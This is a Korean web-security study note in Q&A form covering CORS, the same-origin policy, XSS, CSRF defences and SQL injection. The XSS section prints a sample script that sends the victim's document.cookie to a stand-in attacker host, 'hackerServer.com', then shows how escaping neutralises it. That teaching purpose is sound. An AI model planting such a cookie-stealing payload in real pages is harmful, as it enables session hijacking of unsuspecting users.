## Servlet이란 어떤 것인지

## CORS란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- 브라우저 환경에서만 적용되며 한 출처가 다른 출처에 요청을 할 수 있도록 하는 보안 메커니즘

- 모든 브라우저는 단일 출처 정책(Single Origin Policy)을 따른다

- 즉, 기본적으로 다른 출처에 요청할 수 없지만 서버가 적절하게 구성된 CORS 헤더를 제공하는 경우 선택적으로 교차 출처 정책을 사용할 수 있습니다.

 ### 브라우저에서만 적용된다는 말은 무슨 말인가?
 
- 브라우저에서 다른 서버에서 요청할 경우에 해당되고, 브라우저를 거치지 않고 **서버 간 통신**을 할 때는 이 정책이 적용되지 않는다.

### 단일 출처 정책(Single Origin Policy)이 무엇인가?

- **origin(출처)** 이란 scheme(protocol), host(domain), port 로 구성

- 예를들어, https://www.google.com/maps 라는 주소가 있다고하면 [ protocol은 https:// ] [ Host는 www.google.com ] [ Port는 :443 ]

- 동일 출처(Same Origin) 란 scheme, host, port 가 모두 같을때를 말한다.

- SOP(Same-Origin Policy) 이란 같은 출처에서만 리소스를 공유할 수 있다는 규칙

### 다른 origin에 있는 리소스를 허용하지 않는 이유는 무엇인가?

- ( = 이런 정책이 왜 존재할까?) 만약 다른 출처의 어플리케이션이 서로 통신하는 것에 대해 아무런 제약도 존재하지 않는다면 악의를 가진 사용자가 소스 코드를 보고 CSRF(Cross-Site Request Forgery)나 XSS(Cross-Site Scripting)와 같은 방법을 사용하여 정보를 탈취할 수 있다.

- CORS는 다른 출처의 리소스가 필요한 경우, SOP를 우회하기 위한 여러가지 방법 중 가장 권장되는 방법이다.

https://chanto11.tistory.com/67

https://ingg.dev/cors/

</details>




------
## XSS란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- 공격자가 클라이언트 측 스크립트를 웹 페이지에 삽입하는 공격

- XSS 를 사용하여 동일 출처 정책 및 CSRF 보호를 모두 우회 할 수 있습니다.

- 사용자가 웹 사이트를 방문 할 때마다 트리거되고 이는 서버를 손상시킬 수 있습니다.

- XSS 는 가장 일반적으로 악용되는 취약점입니다.

- XSS 는 출력부분에서 가장 잘 처리할 수 있습니다.

[ 입력 -> 데이터베이스 -> **출력(이스케이프 처리)** ]

### esacpe를 처리한다 라는 말을 들어보았는가? 이게 어떤걸 말하는가?

특정 문자를 원래의 기능에서 벗어나게 변환하는 행위를 **이스케이프(Escape)** 라고 한다.

 HTML에서 다음과 같은 상황은 렌더링이 되지 않는다.  ->  <div>  <onlydev     </div> 
  
HTML은 '<'을 태그의 시작으로 인식하기 때문에 뒷부분이 에러가 나서 제대로 렌더링이 되지 않는다. 이런 상황들을 고려해 원래의 기능에서 벗어난 문자열로 변환하여 의도대로 구문 분석을 하도록 이스케이프를 한다.     ->  <div>     &lt;onlydev      </div>

**그런데 이스케이프가 어떻게 XSS 공격을 방지할 수 있을까?** 

크로스 사이트 스크립팅 공격은 블로그나 게시판 같은 서비스에서 주로 일어나며 여러 사람들이 보는 글에 **스크립트**를 주입해서 사용자의 정보(쿠키, 세션)를 탈취하거나 비정상적인 기능을 수행하게 한다.

예를 들어 글을 쓸 때

1. 제목과 글을 입력해서 글쓰기를 클릭하면
2. 웹 서버에선 해당 데이터를 받아서 DB에 저장한다.
3. 다른 사용자가 해당 서버에 접속해 DB에 있는 해당 글을 읽게 되면
4. 그 때 써놓은 내용을 볼 수 있다.

이런 과정에서 글 대신 **스크립트 언어**를 써서 다른 사용자가 해당 글을 읽을 때 **스크립트 언어가 실행**되어 피해를 입게 하는 것이 XSS 공격이다.
```
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```

해당 스크립트 코드가 실행 되면 피해자의 쿠키값을 해커의 서버 주소인 http://hackerServer.com에 그대로 전부 보내게 되고 해당 정보를 이용해 악용할 수 있는 것이다. 

```
<!-- 이스케이프 후  -->
&lt;script&gt;
  let xmlHttp = new XMLHttpRequest();
  const url =
    &quot;http://hackerServer.com?victimCookie=&quot; +
    document.cookie;
  xmlHttp.open(&quot;GET&quot;, url);
  xmlHttp.send();
&lt;/script&gt;
```

렌더링이 되기 전(사용자에게 보이기 전) 이스케이프된 모든 값은 브라우저에선 아래와 같이 입력한 그대로 보이게 되지만 HTML 본연의 태그나 스크립트 기능이 제거가 되기 때문에 XSS(Cross Site Scripting) 공격을 방지할 수 있다.

```
<!-- 이스케이프 후 브라우저에서 보이는 화면-->
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```

https://wikidocs.net/127508

https://onlydev.tistory.com/78

### **■ 공격 유형에 따른 분류**

공격자가 삽입한 악성스크립트가 사용자 측에서 어떻게 동작하는지에 따라 크게 세 가지로 분류할 수 있으며 각각의 개념과 동작 과정은 다음과 같다.


### **Stored XSS (저장형 크로스사이트 스크립팅)**

공격자의 악성스크립트가 데이터베이스에 저장되고 이 값을 출력하는 페이지에서 피해가 발생하는 취약점이다.

공격자는 악성스크립트가 포함된 게시물을 작성하여 게시판 등 사용자가 접근할 수 있는 페이지에 업로드한다. 이때 사용자가 악성스크립트가 포함된 게시물을 요청하면, 공격자가 삽입한 악성스크립트가 사용자 측에서 동작하게 된다.

공격자의 악성스크립트가 서버에 저장되어 불특정 다수를 대상으로 공격에 이용될 수 있어 Reflected XSS보다 공격 대상의 범위가 훨씬 크다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/68792e47-656d-47ff-b529-9e0f6f6b4777" width="500" height="300"/>
  
[Stored XSS]

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/46b79afb-568a-4364-926d-5479bb3ff3da" width="400" height="300"/>

Stored XSS 공격 과정은 다음을 통해 확인할 수 있다.

[Stored XSS 공격 과정]


### **Reflected XSS (반사형 크로스사이트 스크립팅)**

사용자가 요청한 악성스크립트가 사용자 측에서 반사(Reflected)되어 동작하는 취약점으로, 공격자의 악성스크립트가 데이터베이스와 같은 저장소에 별도로 저장되지 않고 사용자의 화면에 즉시 출력되면서 피해가 발생한다.

공격자는 악성스크립트가 포함된 URL을 이메일, 메신저 등을 통해 사용자가 클릭할 수 있도록 유도한다. 사용자가 악성스크립트가 삽입된 URL을 클릭하거나 공격자에 의해 악의적으로 조작된 게시물을 클릭했을 때 사용자의 브라우저에서 악성스크립트가 실행된다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/7fd0cd4a-127f-4e92-b672-735dd669aaf4" width="500" height="300"/>


[Reflected XSS]

Reflected XSS 공격 과정은 다음을 통해 확인할 수 있다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/fada8137-1912-4d96-8d54-44b8f244752b" width="400" height="300"/>

[Reflected XSS 공격 과정]


### **DOM Based XSS (DOM 기반 크로스사이트 스크립팅)**

공격자의 악성스크립트가 DOM 영역에서 실행됨으로써 서버와의 상호작용 없이 브라우저 자체에서 악성스크립트가 실행되는 취약점이다. DOM 영역에 변화가 생기면 브라우저는 서버로 패킷을 보내지 않고 DOM 영역에서 페이지를 변환시킨다. 따라서 DOM의 일부로 실행되기 때문에 브라우저 자체에서 악성스크립트가 실행된다.

- DOM(Document Object Model, 문서 객체 모델) 이란?

브라우저가 웹 페이지를 렌더링 하는데 사용하는 모델로 HTML 및 XML 문서에 접근하기 위한 인터페이스이다. 브라우저는 HTML 문서를 읽고 해석한 결과를 DOM 형태로 재구성하여 사용자에게 제공한다.

</details>


------
## CSRF란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동을 해서 특정 웹 페이지를 보안에 취약하게 하거나 수정, 삭제 등의 작업을 하게 만드는 공격 방법.

- 공격 난이도가 높지 않아 흔히 사용된다.

- XSS을 이용한 공격이 사용자가 특정 웹사이트를 신용하는 점을 노린 것이라면,

- CSRF는 특정 웹사이트가 사용자의 웹 브라우저를 신용하는 상태를 노린 것이다.

https://devscb.tistory.com/123

### **1.2. CSRF 전제 조건과 공격 과정**

CSRF 공격을 위한 조건과 과정에 대해 알아보겠습니다. CSRF 공격을 시도하기 위해선 아래와 같은 몇 가지 조건이 필요합니다.

- 사용자가 보안이 취약한 서버로부터 이미 인증을 받은 상태여야 합니다.
- 쿠키 기반으로 서버 세션 정보를 획득할 수 있어야 합니다.
- 공격자는 서버를 공격하기 위한 요청 방법에 대해 미리 파악하고 있어야 합니다. 예상치 못한 파라미터가 있으면 불가능합니다.

위와 같은 조건이 만족되면 다음과 같은 과정을 통해 CSRF 공격이 수행됩니다.

1. 사용자는 보안이 취약한 서버에 로그인합니다.
2. 로그인 이후 서버에 저장된 세션 정보를 사용할 수 있는 `sessionID`가 사용자 브라우저 쿠키에 저장됩니다.
3. 공격자는 서버에 인증된 브라우저의 사용자가 악성 스크립트 페이지를 누르도록 유도합니다.
    - 해당 악성 스크립트가 담긴 페이지를 클릭하도록 유도하는 방법은 다양한 것 같으나 몇 가지 유형을 정리하자면 다음과 같습니다.
    - 게시판에 악성 스크립트를 게시글로 작성하여 관리자 혹은 다른 사용자들이 게시글을 클릭하도록 유도합니다.
    - 메일 등으로 악성 스크립트를 직접 전달하거나, 악성 스크립트가 적힌 페이지 링크를 전달합니다.
4. 사용자가 악성 스크립트가 작성된 페이지 접근시 쿠키에 저장된 `sessionID`는 브라우저에 의해 자동적으로 함께 서버로 요청됩니다.
5. 서버는 쿠키에 담긴 `sessionID`를 통해 해당 요청이 인증된 사용자로부터 온 것으로 판단하고 처리합니다.

### CSRF를 방어하는 방법이 무엇이 있는지 설명하라

**Referrer 검증**

서버에서 사용자의 요청에 `Referrer` 정보를 확인하는 방법이 있습니다. 요청 헤더(request header) 정보에서 `Referrer` 정보를 확인할 수 있습니다. 보통이라면 호스트(host)와 `Referrer` 값이 일치하므로 둘을 비교합니다. CSRF 공격의 대부분 `Referrer` 값에 대한 검증만으로 방어가 가능하다고 합니다.

 **CSRF 토큰 검증**

임의의 CSRF 토큰을 만들어 세션에 저장합니다. 요청하는 페이지에 `hidden` 타입 input 태그를 이용해 토큰 값을 함께 전달합니다. 이후 서버에서 세션에 저장된 CSRF 토큰 값과 요청 파라미터에 담긴 토큰 값을 비교합니다

 **Double Submit Cookie 검증**

브라우저의 `Same Origin 정책`을 이용합니다. `Same Origin`이 아닌 경우 `JavaScript`로 쿠키 값을 확인하거나 수정하지 못한다는 점을 이용한 검증 방법입니다. 클라이언트(브라우저)에서 `JavaScript`로 임의의 생성한 토큰을 쿠키와 요청 헤더에 각각 담아서 서버에게 전달합니다. 서버는 전달받은 쿠키와 요청 헤더에서 각자 토큰 값을 꺼내어 이를 비교합니다. 이때, 쿠키에 저장된 토큰 정보는 이후에 재사용하지 못하도록 만료 처리합니다.

</details>




------
## SQL Injection이란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- SQL Injection은 사용자의 입력값이 서버측에서 코드로 실행되는 '코드 인젝션'  공격 기법 중 하나이며, 서버의 데이터베이스를 대상으로 하는 공격이다.

- 사용자 입력값을 제대로 필터링, 이스케이프 하지 않아 발생한다

- 공격의 핵심은 클라이언트 측에서 SQL 쿼리에 신뢰할 수 없는 데이터가 입력되었을 때, 데이터가 쿼리 로직의 일부로 해석되어 DB에서 실행될 때 발생한다.

### 공격 목적

SQL Injection 공격 목적은 다음과 같다. SQL 구문에 추가 절을 삽입하게 되면 쿼리의 의미가 변경되고 의도하지 않은 데이터의 유출, 변조가 가능하다.

1. 정보 유출(Information Leakage)

2. 저장된 데이터 유출 및 조작(Disclosure & Manipulation of stored Data)

3. 원격 코드 실행(Remote Code Excution)
    일부 데이터베이스의 경우 확장 프로시저를 이용하여 원격으로 시스템 명령의 실행이 가능하다. 시스템 명령의 실행은 원격 자원 접근 및 데이터 유출, 삭제가 가능하다.

4. 인증 우회(Bypassing authorisation controls)
    공격의 대표적인 경우로 로그인 폼 등에서 발생한다. 상위 권한을 가진 사용자의 권한으로 인증 절차를 우회하여 로그인 정보 없이 로그인할 수 있다.

https://gomguk.tistory.com/118

</details>
